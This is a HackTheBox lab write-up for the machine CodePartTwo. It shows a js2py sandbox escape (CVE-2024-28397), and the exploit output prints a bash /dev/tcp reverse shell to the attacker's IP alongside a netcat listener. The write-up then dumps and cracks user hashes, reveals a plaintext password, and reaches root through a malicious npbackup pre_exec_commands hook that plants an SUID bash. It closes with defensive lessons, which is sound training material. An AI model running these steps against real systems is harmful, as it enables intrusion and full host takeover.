<p align="center">
  <img src="https://www.hackthebox.com/images/logomark.svg" width="60"/>
</p>

<h1 align="center">🧠 CodePartTwo — HackTheBox Writeup</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Machine-CodePartTwo-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=white&color=111927" alt="Machine"/>
  <img src="https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge" alt="Difficulty"/>
  <img src="https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="OS"/>
  <img src="https://img.shields.io/badge/Status-Retired-grey?style=for-the-badge" alt="Status"/>
</p>

<p align="center">
  <b>Author:</b> <a href="https://medium.com/@ozkirdenizenes">Enes Özkırdeniz</a>
  &nbsp;|&nbsp;
  📝 <a href="https://medium.com/@ozkirdenizenes/codeparttwo-hackthebox-machine-c62c43c27c26">Original Medium Article</a>
</p>

---

## 📋 Machine Info

| Property | Value |
|:---------|:------|
| 🖥️ **Name** | CodePartTwo |
| 🎯 **IP Address** | `10.129.7.213` |
| 🐧 **OS** | Linux (Ubuntu) |
| 📊 **Difficulty** | ![Easy](https://img.shields.io/badge/-Easy-brightgreen?style=flat-square) |
| 🔑 **Key Techniques** | `RCE (CVE-2024-28397)` `Hash Cracking` `Sudo Abuse` |

---

## 🗺️ Attack Path Overview

```
🔍 Enumeration ➜ 🌐 Web App Analysis ➜ 💥 CVE-2024-28397 (js2py RCE)
       ↓
🐚 Reverse Shell (app user) ➜ 🗄️ SQLite DB Dump ➜ 🔑 Hash Cracking
       ↓
👤 SSH as marco ➜ ⬆️ Sudo npbackup-cli Abuse ➜ 🏁 Root!
```

---

## 🔍 Enumeration

As with any penetration test, we take the first step of identifying our target with an Nmap scan. Understanding which services and ports are open on the target IP is critical to determining the attack surface.

### 🛰️ Nmap Scan

```bash
nmap -sC -sV 10.129.7.213
```

**Results:**

| Port | State | Service | Version |
|:----:|:-----:|:--------|:--------|
| 22/tcp | open | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 8000/tcp | open | HTTP | Gunicorn 20.0.4 |

> 📝 **Port 22 (SSH):** OpenSSH version 8.2p1 is running. Although it does not typically contain a direct vulnerability, we are adding it to our notes for the credentials we may obtain in later stages.

> 🌐 **Port 8000 (HTTP):** An application is running on the Gunicorn 20.0.4 web server. The fact that the page title is "Welcome to CodePartTwo" indicates that our main focus will be on this web service.

---

## 🌐 Web Application Analysis

When we went to port 8000, we were greeted by a very modern and corporate-looking landing page. There were three main options that stood out on the page: **Login**, **Register**, and **Download App**.

### 🔎 My Steps of Discovery

1. **Application Review (Download App):** I downloaded the application's source files to my computer using the "Download App" button on the page. Having access to an application's source code allows us to perform "White Box" analysis and significantly facilitates the detection of vulnerabilities.

2. **Sign Up:** I quickly created an account to see how the system works from the inside (Register). The registration process went smoothly, and I gained access to the user dashboard.

### 📁 Application File Structure

```
CodePartTwo/
├── app.py                  # Main application logic
├── requirements.txt        # Libraries required for the application to run
├── instance/
│   └── users.db            # Database File
├── templates/              # Frontend Files
└── static/                 # Frontend Files
```

### 📦 Dependencies — `requirements.txt`

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

> ⚠️ The most notable library here was **js2py**. This library is used to run JavaScript code in a Python environment. However, version 0.74 has a serious **Remote Code Execution (RCE)** vulnerability known in cybersecurity literature.

---

## 💥 Exploitation — CVE-2024-28397

After discovering the critical vulnerability in `js2py` version 0.74, my research led me to the vulnerability identified as **CVE-2024-28397**. This vulnerability allows bypassing the sandbox environment and executing commands directly on the system (RCE).

### 🎯 Exploit Execution

The exploit targets the `/run_code` endpoint of the web application. I used a Python-based exploit script:

```bash
python3 exploit.py --target http://10.129.7.213:8000/run_code --lhost 10.10.16.191
```

**Exploit Output:**
```
CVE-2024-28397 - js2py Sandbox Escape Exploit
Targets js2py ≤ 0.74

[*] Generating exploit payload...
[+] Target URL: http://10.129.7.213:8000/run_code
[+] Reverse shell: (bash >& /dev/tcp/10.10.16.191/4444 0>&1) &
[+] Base64 encoded: KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTkxLzQ0NDQgMD4mMSkgJg==
[+] Listening address: 10.10.16.191:4444

[!] Start your listener: nc -lnvp 4444

[*] Press Enter when your listener is ready...
[*] Sending exploit payload...
[+] Payload sent successfully!
[+] Response: {"error": "'NoneType' object is not callable"}

[+] Check your netcat listener for the reverse shell!
```

### 🐚 Reverse Shell

On a separate terminal, I started a Netcat listener:

```bash
nc -lvnp 4444
```

```
listening on [any] 4444 ...
connect to [10.10.16.191] from (UNKNOWN) [10.129.7.213] 37144
whoami
app
```

> ✅ **Initial foothold obtained!** We now have a shell as the `app` user.

---

## 🗄️ Disclosure of Sensitive Data

After gaining initial access to the system as an app user, I started poking around the file system to look for opportunities to elevate privileges. The `instance` folder located in the application's working directory caught my attention.

### 🔐 Database Extraction

When I examined the contents of this database using the `sqlite3 users.db .dump` command, I accessed the information and passwords (in hash format) of the users on the system.

```bash
sqlite3 instance/users.db .dump
```

The database dump contained the following users:

| 👤 User | 🔑 MD5 Hash |
|:--------|:------------|
| **marco** | `649c9d65a206a75f5abe509fe128bce5` |
| **app** | `a97588c0e2fa3a024876339e27aeb42e` |
| **citron** | `b4a34df68cc2d19e191bd6875ae9a609` |

### 🔓 Hash Cracking — CrackStation

It was time to analyze the MD5 hashes I obtained from the `instance/users.db` database file. I used [CrackStation](https://crackstation.net/) to crack the hashes:

| User | Hash | Result |
|:-----|:-----|:-------|
| **marco** | `649c9d65a206a75f5abe509fe128bce5` | ✅ `sweetangelbabylove` |
| app | `a97588c0e2fa3a024876339e27aeb42e` | ❌ Not found |
| citron | `b4a34df68cc2d19e191bd6875ae9a609` | ❌ Not found |

> 🎉 Marco's password cracked: **`sweetangelbabylove`**

---

## 👤 User Flag

With the cracked password, I logged in via SSH as `marco`:

```bash
ssh marco@10.129.7.213
# Password: sweetangelbabylove
```

```bash
marco@codeparttwo:~$ cat user.txt
🏁 User flag captured!
```

---

## ⬆️ Privilege Escalation — Root

### 🔎 Sudo Permissions Enumeration

First, I checked what commands `marco` can run with elevated privileges:

```bash
marco@codeparttwo:~$ sudo -l
```

> 📌 Result: `marco` can run `/usr/local/bin/npbackup-cli` command with root privileges **without entering any password**. The `npbackup.conf` file we saw in the home directory was likely managing the configuration of this tool.

### 📖 Analyzing npbackup-cli

First, let's look at the help menu to find out what kind of parameters the tool accepts:

```bash
marco@codeparttwo:~$ /usr/local/bin/npbackup-cli -h
```

Parameters that stand out in the output:

- `-c CONFIG_FILE, --config-file CONFIG_FILE` → We can specify an alternative configuration file
- `-b, --backup` → Starting backup process
- `--show-config` → Displays the current configuration

### 📂 Finding the Configuration File

`npbackup-cli` uses a configuration file. Let's scan the system:

```bash
marco@codeparttwo:~$ find / -name "*npbackup*.conf" 2>/dev/null
/home/marco/npbackup.conf
```

### 🗡️ Crafting the Malicious Config

The configuration file supports a `pre_exec_commands` hook that runs before the backup. We can abuse this to execute arbitrary commands as root.

**Step 1:** Copy the legitimate config to a temp location:

```bash
marco@codeparttwo:/tmp$ cp /home/marco/npbackup.conf /tmp/evil.conf
```

**Step 2:** Edit the config file and modify the `pre_exec_commands` section:

```bash
marco@codeparttwo:~$ nano /tmp/evil.conf
```

Find the line `pre_exec_commands: []` and change it as follows:

```yaml
pre_exec_commands:
  - /bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
```

> 💡 This command:
> 1. Copies `/bin/bash` to `/tmp/rootbash`
> 2. Sets the SUID bit (enables it to run with root privileges)

**Step 3:** Run the backup with the malicious config:

```bash
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c /tmp/evil.conf -b
```

### 🏁 Root Shell

```bash
marco@codeparttwo:/tmp$ /tmp/rootbash -p
rootbash-5.0# whoami
root
rootbash-5.0# cat /root/root.txt
🏁 Root flag captured!
```

> 🎉 **Machine fully compromised!**

---

## 🧰 Tools Used

<p align="center">
  <img src="https://img.shields.io/badge/Nmap-0078D4?style=for-the-badge&logo=nmap&logoColor=white" alt="Nmap"/>
  <img src="https://img.shields.io/badge/Python3-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python"/>
  <img src="https://img.shields.io/badge/Netcat-333333?style=for-the-badge&logo=gnu&logoColor=white" alt="Netcat"/>
  <img src="https://img.shields.io/badge/SQLite3-003B57?style=for-the-badge&logo=sqlite&logoColor=white" alt="SQLite3"/>
  <img src="https://img.shields.io/badge/CrackStation-FF0000?style=for-the-badge&logo=hashicorp&logoColor=white" alt="CrackStation"/>
  <img src="https://img.shields.io/badge/SSH-000000?style=for-the-badge&logo=openssh&logoColor=white" alt="SSH"/>
</p>

---

## 📚 Key Takeaways

| # | Lesson |
|:-:|:-------|
| 1 | 🔍 Always check **dependency versions** for known CVEs — `requirements.txt` can reveal critical vulnerabilities |
| 2 | 🐍 **js2py ≤ 0.74** is vulnerable to sandbox escape (CVE-2024-28397) — never trust client-side sandboxing |
| 3 | 🔑 **MD5 hashes** without salt are trivially crackable — use bcrypt or argon2 instead |
| 4 | ⚙️ **Sudo misconfigurations** with backup tools can lead to full system compromise |
| 5 | 📝 Tools with `pre_exec_commands` hooks are dangerous when run with elevated privileges |

---

## 🔗 References

- 🔗 [CVE-2024-28397 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)
- 🔗 [js2py GitHub](https://github.com/nickoala/pyjsparser)
- 🔗 [CrackStation](https://crackstation.net/)
- 🔗 [GTFOBins](https://gtfobins.github.io/)

---

<p align="center">
  <a href="../README.md">⬅️ Back to Main Repository</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Made%20with-❤️-red?style=flat-square" alt="Made with love"/>
  <img src="https://img.shields.io/badge/Happy-Hacking!%20🚀-9FEF00?style=flat-square" alt="Happy Hacking"/>
</p>
